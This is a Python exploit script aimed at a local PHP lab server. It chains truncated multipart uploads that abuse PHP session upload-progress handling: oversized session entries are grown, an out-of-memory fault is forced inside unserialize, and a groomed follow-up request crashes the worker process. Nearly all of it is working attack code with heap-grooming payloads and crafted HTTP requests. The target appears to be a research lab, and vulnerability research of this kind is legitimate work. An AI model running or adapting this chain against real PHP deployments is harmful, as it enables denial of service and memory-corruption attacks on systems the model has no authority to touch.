#!/usr/bin/env python3
"""8083 FULL CHAIN v2 (flock-free growth via truncated bodies).

KEY PRIMITIVE: multipart body WITHOUT the final boundary => parser EOFs, no
MULTIPART_EVENT_END => NO cleanup => progress entry persists via the request's
NORMAL session_write_close => flock released cleanly. Session file grows by
one entry per truncated request.

P0: grow H  SID_H key A, 400KB name, TRUNCATED  => sess_H ~400K (flock-free)
P1: grow H  key B, 150KB name, TRUNCATED        => sess_H ~550K
P2: grow H  key C,  50KB name, TRUNCATED        => sess_H ~600K
P3: decode-OOM producer: SID_H + 24x40KB groom + key D + tiny file (COMPLETE)
    => FILE_START update => initialize => s_read 600K fits => decode STRINGS
    => OOM INSIDE php_var_unserialize => BG(unserialize) stale (this request
    leaks flock on H afterwards - H is retired by then).
P4: grow Z  SID_Z key Z, 100KB name, TRUNCATED  => sess_Z ~100K (flock-free)
P5: consumer (SAME WORKER as P3): 30x193B groom fields (224-bin strings ==
    d_u bin) + SID_Z + key E + tiny file => initialize => decode sess_Z =>
    UNSER_INIT REUSES stale d_u => tmp_var walks last_dtor = 193 (0xC1)
    => SEGV at 0xC1 => worker death => bias rotate.
"""
import socket, re, time, sys

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
SID_H = b"0f1e2d3c4b5a69788796a5b4c3d2e1f0"
SID_Z = b"13579bdf02468ace13579bdf02468ace"

def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts, terminate=True):
    body = b"".join(parts)
    if terminate:
        body += b"--" + B + b"--\r\n"
    return body

def post_head(blen):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\nConnection: keep-alive\r\n\r\n").encode()

class KA:
    def __init__(self): self.s = socket.create_connection((HOST, PORT), timeout=30)
    def send(self, head, body=None, timeout=120):
        t0 = time.time()
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)): return buf, time.time() - t0
            try: d = self.s.recv(65536)
            except socket.timeout: return buf + b"\n<TIMEOUT>", time.time() - t0
            except ConnectionResetError: return buf + b"\n<RESET>", time.time() - t0
            if not d: return buf + b"\n<EOF>", time.time() - t0
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.split(b"\r\n\r\n", 1)[1].strip()
    except Exception as e:
        return f"ERR:{type(e).__name__}".encode()

def stat(r):
    mm = re.search(rb"tried to allocate (\d+)", r)
    alloc = mm.group(1).decode() if mm else "-"
    ok = b"lab ok" in r
    return f"rawlen={len(r)} fatal={b'Allowed memory' in r} alloc={alloc} labok={ok}"

b0 = bias()
print(f"bias BEFORE: {b0!r}", flush=True)

ka = KA()
def fire(tag, parts, terminate=True, timeout=150):
    body = pb(parts, terminate)
    r, dt = ka.send(post_head(len(body)), body, timeout=timeout)
    print(f"[{tag}] {stat(r)} t={dt:.1f}s", flush=True)
    return r

# P0-P2: grow sess_H via truncated requests (no cleanup, no flock leak)
fire("P0 grow H 400K", [part(b"PHPSESSID", SID_H), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyA"),
                        part(b"u", b"x" * 100, filename=b"G" * (400 * 1024))], terminate=False)
fire("P1 grow H 150K", [part(b"PHPSESSID", SID_H), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyB"),
                        part(b"u", b"x" * 100, filename=b"G" * (150 * 1024))], terminate=False)
fire("P2 grow H 50K",  [part(b"PHPSESSID", SID_H), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyC"),
                        part(b"u", b"x" * 100, filename=b"G" * (50 * 1024))], terminate=False)

# P3: decode-OOM producer (complete body; groom pressure + tiny file)
p3 = [part(b"PHPSESSID", SID_H)]
for i in range(24):
    p3.append(part(f"g{i}".encode(), b"M" * (40 * 1024)))
p3.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyD"))
p3.append(part(b"u", b"y", filename=b"t.txt"))
fire("P3 decode-OOM", p3, terminate=True)

# P4: grow sess_Z (truncated, tiny-ish entry) - different SID, flock-free
fire("P4 grow Z 100K", [part(b"PHPSESSID", SID_Z), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyZ"),
                        part(b"u", b"x" * 100, filename=b"H" * (100 * 1024))], terminate=False)

# P5: consumer groom on Z (same worker as P3!)
p5 = []
for i in range(30):
    p5.append(part(f"s{i}".encode(), (b"U%02d" % i).ljust(193, b"Q")))
p5.append(part(b"PHPSESSID", SID_Z))
p5.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyE"))
p5.append(part(b"u", b"y", filename=b"a.txt"))
r, dt = fire("P5 consumer groom", p5, terminate=True)
ka.close()

b1 = bias()
print(f"bias AFTER:  {b1!r}", flush=True)
print(f"SAME_WORKER={b0 == b1}", flush=True)
